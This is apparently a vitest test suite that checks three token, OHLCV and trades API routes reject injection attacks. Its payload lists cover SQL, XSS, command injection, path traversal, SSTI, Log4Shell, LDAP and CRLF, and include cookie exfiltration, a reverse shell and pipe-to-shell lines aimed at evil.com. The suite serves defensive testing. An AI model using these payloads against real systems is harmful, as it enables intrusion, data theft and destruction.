/**
 * Comprehensive injection attack tests across all API routes.
 * Covers OWASP Top 10 A03 (Injection).
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { GET as getToken }  from '@/app/api/token/[address]/route';
import { GET as getOhlcv }  from '@/app/api/ohlcv/[address]/route';
import { GET as getTrades } from '@/app/api/trades/[address]/route';

vi.stubGlobal('fetch', vi.fn());

function params(address: string) {
  return { params: Promise.resolve({ address }) };
}

const ALL_ROUTES = [
  {
    name: '/api/token/[address]',
    call: (addr: string) => getToken(new Request(`http://localhost/api/token/${addr}`), params(addr)),
  },
  {
    name: '/api/ohlcv/[address]',
    call: (addr: string) => getOhlcv(new Request(`http://localhost/api/ohlcv/${addr}`), params(addr)),
  },
  {
    name: '/api/trades/[address]',
    call: (addr: string) => getTrades(new Request(`http://localhost/api/trades/${addr}`), params(addr)),
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// Injection payload categories
// ─────────────────────────────────────────────────────────────────────────────

const SQL_PAYLOADS = [
  "' OR '1'='1",
  "1; DROP TABLE tokens; --",
  "' UNION SELECT username, password FROM users--",
  "1 AND 1=1",
  "admin'--",
  "1 OR 1=1",
  "' OR 'x'='x",
  "1; SELECT * FROM information_schema.tables",
  "1 AND SLEEP(5)--",
  "1; WAITFOR DELAY '0:0:5'--",
  "'; EXEC xp_cmdshell('whoami');--",
  "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
  "1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,...",
];

const XSS_PAYLOADS = [
  '<script>alert(document.cookie)</script>',
  '"><script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  'vbscript:msgbox(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '"><input autofocus onfocus=alert(1)>',
  "';alert(String.fromCharCode(88,83,83))//",
  '<script>fetch("https://evil.com?c="+document.cookie)</script>',
  '<img src="x" onerror="fetch(`//evil.com/${document.cookie}`)">',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
];

const CMD_PAYLOADS = [
  'addr | cat /etc/passwd',
  'addr; rm -rf /',
  'addr`id`',
  'addr$(cat /etc/shadow)',
  'addr && curl evil.com | sh',
  'addr || evil_command',
  'addr > /tmp/evil.sh',
  '$(touch /tmp/pwned)',
  '; nc -e /bin/sh evil.com 4444',
  '`curl evil.com/shell.sh | bash`',
];

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\cmd.exe',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%5C..%5C..%5Cwindows%5Csystem32',
  '....//....//....//etc//passwd',
  '/etc/passwd',
  '/proc/self/environ',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', // overlong UTF-8
];

const NULL_BYTE_PAYLOADS = [
  '\x00',
  '\x00validaddr',
  'addr\x00.evil',
  'A'.repeat(30) + '\x00' + 'B'.repeat(10),
  '%00',
  'valid\x00malicious',
];

const SSTI_PAYLOADS = [
  '{{7*7}}',
  '${7*7}',
  '#{7*7}',
  '<%= 7*7 %>',
  '{{config}}',
  '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
  '${T(java.lang.Runtime).getRuntime().exec("id")}',
  '#{ 7 * 7 }',
  '{php}echo `id`;{/php}',
];

const LOG4SHELL_PAYLOADS = [
  '${jndi:ldap://evil.com/a}',
  '${jndi:rmi://evil.com/a}',
  '${jndi:dns://evil.com/a}',
  '${${lower:j}ndi:${lower:l}${lower:d}${lower:a}p://evil.com}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
  '${j${::-n}di:ldap://evil.com/a}',
];

const LDAP_PAYLOADS = [
  '*)(uid=*))(|(uid=*',
  '*(|(mail=*))',
  '*))(|(objectclass=*)',
  '*)(|(objectClass=*)',
];

const CRLF_PAYLOADS = [
  'addr\r\nX-Evil: injected',
  'addr\nHost: evil.com',
  'addr\r\n\r\n<html>phishing</html>',
  'addr%0d%0aX-Evil: injected',
  'addr%0aSet-Cookie: session=hijacked',
];

// ─────────────────────────────────────────────────────────────────────────────

describe('Injection Attack Tests (OWASP A03)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  ALL_ROUTES.forEach(({ name, call }) => {
    describe(name, () => {
      describe('SQL Injection', () => {
        SQL_PAYLOADS.forEach(payload => {
          it(`rejects SQL: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('XSS (reflected)', () => {
        XSS_PAYLOADS.forEach(payload => {
          it(`rejects XSS: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
            const text = await res.text();
            // Must not reflect raw HTML/script back
            expect(text).not.toContain('<script');
            expect(text).not.toContain('onerror=');
          });
        });
      });

      describe('Command Injection', () => {
        CMD_PAYLOADS.forEach(payload => {
          it(`rejects cmd: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('Path Traversal', () => {
        PATH_TRAVERSAL_PAYLOADS.forEach(payload => {
          it(`rejects traversal: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('Null Byte Injection', () => {
        NULL_BYTE_PAYLOADS.forEach(payload => {
          it(`rejects null byte: ${JSON.stringify(payload).slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('Server-Side Template Injection (SSTI)', () => {
        SSTI_PAYLOADS.forEach(payload => {
          it(`rejects SSTI: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('Log4Shell / JNDI', () => {
        LOG4SHELL_PAYLOADS.forEach(payload => {
          it(`rejects Log4Shell: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('LDAP Injection', () => {
        LDAP_PAYLOADS.forEach(payload => {
          it(`rejects LDAP: ${payload.slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });

      describe('CRLF / Header Injection', () => {
        CRLF_PAYLOADS.forEach(payload => {
          it(`rejects CRLF: ${JSON.stringify(payload).slice(0, 40)}`, async () => {
            const res = await call(payload);
            expect(res.status).toBe(400);
          });
        });
      });
    });
  });

  describe('Error responses do not echo payloads', () => {
    it('SQL payload not reflected in response body', async () => {
      const payload = "' OR '1'='1; DROP TABLE--";
      const res = await getToken(new Request(`http://localhost/api/token/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain("' OR");
      expect(text).not.toContain('DROP TABLE');
    });

    it('XSS payload not reflected in response body', async () => {
      const payload = '<script>evil()</script>';
      const res = await getToken(new Request(`http://localhost/api/token/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain('<script>');
    });

    it('Log4Shell payload not reflected in response body', async () => {
      const payload = '${jndi:ldap://evil.com/a}';
      const res = await getToken(new Request(`http://localhost/api/token/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain('jndi:ldap');
    });
  });
});
